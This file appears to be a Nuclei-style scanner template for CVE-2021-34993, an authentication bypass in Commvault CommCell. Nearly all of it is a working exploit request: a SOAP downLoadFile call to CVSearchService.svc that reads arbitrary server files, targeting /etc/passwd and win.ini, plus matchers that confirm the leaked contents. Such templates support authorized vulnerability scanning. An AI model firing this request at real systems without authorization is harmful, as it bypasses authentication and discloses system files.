folder-5/poc-yaml-commvault-commcell-identity-authentication-bypass-cve-2021-34993.yaml

id: commvault-commcell-auth-bypass-cve-2021-34993

info:
  name: Commvault CommCell Authentication Bypass Vulnerability (CVE-2021-34993)
  author: ProjectDiscoveryAI
  severity: critical
  tags: CVE-2021-34993,authentication-bypass,critical

variables:
  path:
    - "C:/Windows/win.ini"
    - "/etc/passwd"

http:
  - raw:
      - |
        POST /SearchSvc/CVSearchService.svc HTTP/1.1
        Host: {{Hostname}}
        SOAPAction: "http://tempuri.org/ICVSearchSvc/downLoadFile"
        Content-Type: text/xml
        Cookie: login

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
          <soapenv:Header/>
          <soapenv:Body>
            <tem:downLoadFile>
              <tem:path>§path§</tem:path>
            </tem:downLoadFile>
          </soapenv:Body>
        </soapenv:Envelope>

    payloads:
      path: '{{path}}'

    matchers-condition: or
    matchers:
      - type: word
        words:
          - "root:"
          - "/bin"
        condition: and

      - type: word
        words:
          - "bit app support"
          - "[files]"
        condition: and

    extractors:
      - type: regex
        part: body
        regex:
          - "(?:root:.*?:/bin)|(?:bit app support.*?\\[files\\])"
